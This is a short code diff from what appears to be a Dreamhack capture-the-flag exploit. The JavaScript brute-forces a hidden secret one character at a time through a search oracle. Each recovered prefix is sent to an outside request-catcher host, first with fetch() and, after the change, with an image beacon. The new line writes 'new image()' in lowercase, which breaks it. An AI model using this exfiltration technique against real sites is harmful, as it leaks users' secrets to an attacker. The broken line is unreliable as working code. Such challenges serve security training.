@@ -43,16 +43,10 @@
                         await new Promise(resolve => setTimeout(resolve, 100)); // Delay to avoid rate limiting
                         if (await search(secret + c)) {
                             secret += c;
-                            fetch(`https://fyttbsg.request.dreamhack.games?flag=${encodeURIComponent(secret)}`, {
-                                mode: 'no-cors'
-                            });
+                            new image().src = `https://pdvsomq.request.dreamhack.games?secret=${secret}`;
                             console.log(`found: ${secret}`);
                             found = true;
                             break;
-                        } else {
-                            fetch(`https://fyttbsg.request.dreamhack.games?nop=nop`, {
-                                mode: 'no-cors'
-                            });
                         }
                     }
 
